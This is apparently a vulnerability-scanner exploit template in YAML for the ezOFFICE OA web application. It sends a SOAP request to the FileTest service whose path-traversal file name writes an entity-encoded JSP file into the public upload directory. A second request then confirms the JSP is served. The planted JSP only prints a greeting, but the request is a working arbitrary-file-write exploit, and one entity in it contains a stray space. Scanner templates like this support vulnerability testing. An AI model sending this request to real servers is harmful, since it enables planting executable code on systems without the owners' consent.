core/plugins/exploits/户oa_filetest文件上传.yaml

app: ezoffice
query: app:"ezoffice"
meta:
  name: 户OA_FileTest文件上传
  level: 4
  tags:
  - file_upload
  description: ""
  homepage: ""
  author: X prism
  references: ""
  solution: ""
  create_at: "2024-07-13 13:02:58"
  available: false
  steps:
    variable: []
    verify_steps:
      type: and
      verify:
      - request:
          method: POST
          path: /defaultroot/services/FileTest;1.js
          redirect: true
          header:
          - Content-Type: text/xml;charset=UTF-8
          params: |-
            <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:util="http://com.whir.ezoffice.ezform.util.StringUtil" xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/"> <soapenv:Header/>
            <soapenv:Body> <util:printToFile soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
            <fileName xsi:type="soapenc:string">../server/oa/deploy/defaultroot.war/public/upload/ssassa.jsp.</fileName> <content xsi:type="soapenc:string">&#x3c;&#x25;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x6f;&#x75;&#x74;&#x2e;&#x70;&#x 72;&#x69;&#x6e;&#x74;&#x28;&#x22;&#x68;&#x65;&#x6c;&#x6c;&#x6f;&#x20;&#x77;&#x6f;&#x72;&#x6c;&#x64; &#x21;&#x22;&#x29;&#x3b;&#x0a;&#x25;&#x3e;</content>
            </util:printToFile></soapenv:Body></soapenv:Envelope>
        response:
        - name: code
          value: "200"
          type: equals
        - name: body
          value: xml version
          type: contains
      - request:
          method: GET
          path: /defaultroot/public/upload/ssassa.jsp
          redirect: true
          header: []
          params: ""
        response:
        - name: code
          value: "200"
          type: equals
    exploit_steps:
      type: ""
      params:
        name: ""
        type: input
        value: ""
